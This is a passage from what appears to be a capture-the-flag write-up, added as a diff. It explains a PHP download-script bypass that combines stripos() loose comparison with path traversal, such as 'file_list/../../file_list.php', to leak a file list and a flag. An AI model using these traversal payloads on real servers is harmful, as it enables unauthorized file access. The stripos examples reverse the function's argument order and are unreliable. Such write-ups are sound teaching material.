@@ -80,5 +80,68 @@ header("Content-Disposition: attachment; filename='$filename'");
 readfile("uploads/$filename");
 ```
 
+## Flag 2
+
+Flag 1 tells you that the next task is to try to download file_list. Reading the code the only thing that stuck out to me was the if statement 
+
+Stripos will return the location of when it found the first parameter in the second parameter or false if not found
+```
+stripos('a', 'brandon') = 2
+
+stripos('a', 'apple') = 0
+
+stripos('q', 'apple') = false
+```
+
+In PHP, == or != will only compare value and not type, === will compare both value and type 
+
+```
+0 == false  = True
+
+0 === false = False
+
+1 == true   = True
+
+1 === true  = Flase 
+```
+ 
+We need to get past the if statment in order for us to download the file, in order for it to get past the if statment the stripos would have to output 0 or false
+
+In order for stripos to output a 0 file_list would have to be the start of the query
 
 
+/download?f=file_list 
+
+This query downloads an empty file, that means that it was looking in the wrong directory for file_list and it was not found. 
+
+/download?f=../file_list
+
+This query doesn't download a file because the stripos will return 3 making the script die 
+
+So we know that file_list needs to be at he begining of the file name as well as we have to go to the correct directory
+
+/download?f=file_list/../../file_list.php 
+
+Works!! 
+
+What this is doing is are saying look in the file_list directory wait do back a directory so we are back where we are then do back one more directory and grab the file_list.php file
+
+```
+<?php
+$files = [
+  [FALSE, 1, 'test.cpp', 192, '6a92b449761226434f5fce6c8e87295a'],
+  [FALSE, 2, 'test.c', 325, '27259bca9edf408829bb749969449550'],
+  [TRUE, 3, 'flag_ef02dee64eb575d84ba626a78ad4e0243aeefd19145bc6502efe7018c4085213', 1337, 'flag_ef02dee64eb575d84ba626a78ad4e0243aeefd19145bc6502efe7018c4085213'],
+  [FALSE, 4, 'test.py', 94, '951470281beb8a490a941ac73bd10953'],
+]; 
+```
+
+YAY!! 
+
+If you submit the query
+
+download.php?f=flag_ef02dee64eb575d84ba626a78ad4e0243aeefd19145bc6502efe7018c4085213
+
+```
+TWCTF{php_is_very_secure}
+```
